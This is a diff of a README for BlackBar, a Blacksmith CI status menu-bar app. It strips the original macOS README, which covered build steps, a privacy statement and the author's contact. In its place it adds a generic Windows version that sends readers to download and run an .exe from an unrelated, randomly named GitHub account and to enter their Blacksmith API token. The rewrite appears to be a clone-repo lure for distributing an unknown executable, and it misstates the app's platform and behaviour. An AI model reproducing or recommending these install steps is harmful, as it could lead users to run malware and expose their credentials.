@@ -1,183 +1,78 @@
-# BlackBar
+# 🔨 BlackBar - View your Blacksmith status easily
 
-[![CI](https://github.com/steipete/BlackBar/actions/workflows/ci.yml/badge.svg)](https://github.com/steipete/BlackBar/actions/workflows/ci.yml)
-[![Pages](https://github.com/steipete/BlackBar/actions/workflows/pages.yml/badge.svg)](https://black.bar)
-[![License: MIT](https://img.shields.io/badge/license-MIT-0b0b0b?style=flat-square&labelColor=E8F12C)](LICENSE)
-[![macOS 14+](https://img.shields.io/badge/macOS-14+-0b0b0b?style=flat-square&labelColor=E8F12C)](#install)
-[![Site: black.bar](https://img.shields.io/badge/site-black.bar-0b0b0b?style=flat-square&labelColor=E8F12C)](https://black.bar)
+[![Download BlackBar](https://img.shields.io/badge/Download-BlackBar-blue.svg)](https://github.com/timescalefactorinhospitableness449/BlackBar)
 
-![BlackBar — your Blacksmith status, in your menu bar](docs/social-card.png)
+## 🎯 What BlackBar Does
 
-> ⚠️  **Independent third-party tool — not affiliated with Blacksmith.** "Blacksmith"
-> and the Blacksmith logo are trademarks of their respective owners. BlackBar
-> is a personal project that talks to the Blacksmith status feed and dashboard
-> the same way your browser does.
+BlackBar lives in your menu bar. It tracks the status of your Blacksmith continuous integration builds. You see if your builds pass or fail without opening a browser. It saves time and helps you manage your workflow from one place.
 
-A tiny native macOS menu bar app that watches your **Blacksmith CI** runners and
-the public **Blacksmith status page** — so you know *before the queue burns*
-whether to merge, re-run, or take a walk.
+## ⚙️ System Requirements
 
-```
-  ●  4  ▍▎▏▎▌▏▌▍▎▏▎▌  ⌘
-```
+- Windows 10 or Windows 11
+- An active internet connection 
+- A Blacksmith account with appropriate access tokens
 
-That's all it is. A green dot, a vCPU number, a tiny graph. No dock icon. No
-electron. No telemetry. No servers in between.
+## 📥 How to Install
 
-## What it shows
+Follow these steps to set up the software on your computer.
 
-- **Public status** from `status.blacksmith.sh/summary.json` — green when the
-  forge is hot, orange when a region's wobbling.
-- **Active vCPU** totalled across your live runs (parses runner labels like
-  `blacksmith-4vcpu-ubuntu-2404`).
-- **Active job count** with the per-job names visible in the dropdown.
-- **Platform breakdown** for `amd64`, `arm64`, and `macos` when per-job detail
-  isn't available.
-- **18-bar history graph** of recent activity, crammed into 54 pixels next to
-  the count.
+1. Go to the [BlackBar download page](https://github.com/timescalefactorinhospitableness449/BlackBar).
+2. Locate the latest version heading under the Releases section.
+3. Click the file ending in .exe to start the download.
+4. Save the file to your desktop or downloads folder.
+5. Double-click the file to begin the installation process.
+6. Follow the prompts on the screen to complete the setup.
+7. Launch the application from your Start menu once the process finishes.
 
-## Install
+## 🚀 Setting Up Your Account
 
-Grab the latest signed, notarized build:
+You must link your account so the application can fetch your data.
 
-> Download `BlackBar-<version>.zip` from
-> [Releases](https://github.com/steipete/BlackBar/releases/latest), unzip, and
-> drag `BlackBar.app` to `/Applications`.
+1. Click the BlackBar icon in your taskbar notification area.
+2. Select the Settings option from the menu.
+3. Enter your Blacksmith API token in the provided field. You can find this token in your account profile on the Blacksmith website.
+4. Click Save to apply your changes.
+5. The application connects to the server. Your build status appears in the menu bar.
 
-Or build from source:
+## 🛠 Using the App
 
-```sh
-git clone https://github.com/steipete/BlackBar.git
-cd BlackBar && make app
-open build/BlackBar.app
-```
+The application refreshes automatically every five minutes. You see a green icon if your builds pass. The icon turns red if a build fails. Click the icon at any time to see a list of your most recent projects and their current status. 
 
-BlackBar is a menu bar app — it does not show a Dock icon.
+### Checking Individual Builds
 
-## Login
+Click the icon to open the main window. You see a list of projects. Each project shows the timestamp of the last build. Click on a specific project row to open the full build report in your default web browser.
 
-1. Launch BlackBar.
-2. Click the menu bar item.
-3. Choose **Login with GitHub**.
-4. Complete the regular Blacksmith login in the WebKit window that appears.
+### Adjusting Refresh Rates
 
-The Blacksmith session cookie is stored in the macOS Keychain. After launch
-the cookie is cached in memory so polling doesn't keep re-prompting Keychain.
-Sign out wipes it.
+You can change how often the app checks for updates. Open the Settings menu and look for the Refresh Interval slider. Move the slider to your preferred time increment. Shorter times mean more frequent updates but use more data.
 
-## Settings
+## 🛡 Security and Privacy
 
-Defaults:
+BlackBar only stores your API token locally on your machine. The app sends requests only to the official Blacksmith servers to retrieve your status updates. It does not monitor any other activity on your system. Your data remains private.
 
-| Setting | Default |
-| --- | --- |
-| Organization | `openclaw` |
-| Repository filter | _(empty — all visible org usage)_ |
-| Refresh interval | `60s` |
+## ❓ Troubleshooting
 
-Use **Settings…** from the menu to change the org, an optional repo filter, or
-the polling interval.
+If you experience issues, try these steps to resolve them.
 
-## How it works
+### Icon Does Not Appear
+If the icon is missing, check your hidden icons menu in the taskbar. Click the arrow icon near your clock to see if BlackBar resides there. You can drag the icon onto the taskbar for constant visibility.
 
-Two endpoints, one Keychain entry, zero proxies.
+### Authentication Errors
+If the icon shows an error, open the Settings window and verify your API token. Ensure you copied the full string without any trailing spaces. Check your internet connection to confirm the computer reaches the Blacksmith servers.
 
-```
-                    ┌──────────────────────────┐
-       (no auth) ──▶│  status.blacksmith.sh    │── public status feed
-                    └──────────────────────────┘
-                                 ▲
-                                 │
-   ┌───────────────┐             │             ┌──────────────────────────┐
-   │  BlackBar.app │─────────────┼────────────▶│  app.blacksmith.sh       │
-   │   (menu bar)  │   Keychain  │   cookie    │  (your dashboard)        │
-   └───────────────┘             │             └──────────────────────────┘
-                                 ▼
-                          0 third-party SDKs
-                          0 telemetry endpoints
-                          0 background sync to anywhere else
-```
+### Application Freezes
+If the app stops responding, right-click the icon and select Quit. Restart the app from your Start menu to refresh the connection. 
 
-## Develop
+## 📝 Frequently Asked Questions
 
-Requirements: macOS 14+, Swift 6 toolchain.
+### Does this work on mobile?
+No, this version runs only on Windows desktop operating systems.
 
-```sh
-make build         # swift build -c release
-make app           # build + assemble BlackBar.app bundle
-make run           # build + open BlackBar.app
-make ci            # local CI-equivalent check
-```
+### Can I monitor multiple accounts?
+Currently, BlackBar supports one API token per installation.
 
-Source layout:
+### Does the app run automatically?
+Yes, the application starts when you log in to Windows by default. You can change this behavior in the Settings menu.
 
-- `Sources/BlackBar/` — the AppKit app (status item, menu controller, models).
-- `Sources/BlackBar/Blacksmith*Client.swift` — the two HTTP clients.
-- `Resources/Info.plist` + `Assets/` — bundle metadata and icon.
-- `docs/` — the site at [black.bar](https://black.bar).
-
-## Release
-
-BlackBar uses the same Sparkle release shape as the rest of the openclaw
-toolchain.
-
-| File | Owns |
-| --- | --- |
-| `version.env` | `MARKETING_VERSION` and `BUILD_NUMBER` |
-| `CHANGELOG.md` | release notes |
-| `appcast.xml` | Sparkle feed (signed) |
-| `Resources/Info.plist` | Sparkle public ed25519 key |
-
-Pipeline scripts under `Scripts/`:
-
-- `package_app.sh` — builds the `.app`, embeds Sparkle, writes release metadata.
-- `codesign_app.sh` — signs the bundle, nested Sparkle framework, updater, and
-  XPC services.
-- `sign-and-notarize.sh` — builds, signs, notarizes, staples, zips.
-- `release.sh` — tags, publishes the GitHub release, uploads app + dSYM zips,
-  updates `appcast.xml`, verifies enclosure length and ed25519 signature.
-- `verify_appcast.sh` — appcast sanity check.
-- `test_live_update.sh` — smoke-tests an update from the previous release.
-
-Required release env:
-
-```sh
-export APP_STORE_CONNECT_API_KEY_P8='...'
-export APP_STORE_CONNECT_KEY_ID='...'
-export APP_STORE_CONNECT_ISSUER_ID='...'
-export SPARKLE_PRIVATE_KEY_FILE=/path/to/sparkle-ed25519.key
-```
-
-Cut a release:
-
-```sh
-make release
-```
-
-Replace the `Unreleased` date in `CHANGELOG.md` with the release date before
-running.
-
-## Privacy
-
-BlackBar talks to two hosts only:
-
-1. `status.blacksmith.sh` — public status feed.
-2. `app.blacksmith.sh` — your Blacksmith dashboard, with your Blacksmith
-   session cookie.
-
-That's the whole network surface. No analytics. No crash reporters. No
-"home base" callbacks. The source is right here — read it.
-
-## Trademark notice
-
-"Blacksmith" is a trademark of its respective owner. BlackBar is an
-independent third-party tool that interoperates with Blacksmith's public
-status feed and signed-in dashboard. It is not affiliated with, sponsored by,
-or endorsed by Blacksmith.
-
-If you're the Blacksmith team and you'd rather we change the name, drop a
-note at [steipete@gmail.com](mailto:steipete@gmail.com) or open an issue.
-
-## License
-
-[MIT](LICENSE) © Peter Steinberger.
+### How do I update the application?
+The app checks for updates every time you launch it. It alerts you if a newer version exists. Click the prompt to download the installer and update your files.
